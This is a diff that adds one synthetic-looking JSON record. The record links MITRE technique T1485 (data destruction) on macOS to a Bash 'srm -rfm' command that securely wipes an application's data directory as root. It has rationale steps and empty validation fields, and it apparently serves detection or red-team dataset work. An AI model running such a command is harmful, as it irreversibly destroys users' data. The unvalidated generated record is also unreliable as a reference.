@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "srm -rfm \"/Library/Application Support/AcmeApp/Data\"",
+  "explanation": "Recursively wipes an application\u2019s data directory with multi-pass overwrite to disrupt availability of its data.",
+  "rationale_steps": [
+    "Identify a single application's data path to focus impact.",
+    "Use -r to remove nested files and -m for multi-pass overwrite.",
+    "Execute as root to ensure all files can be securely deleted."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-45236c1a-ccaf355a",
+  "source_prompt_hash": "45236c1a",
+  "timestamp_utc": "2025-09-30T07:56:40.760169Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
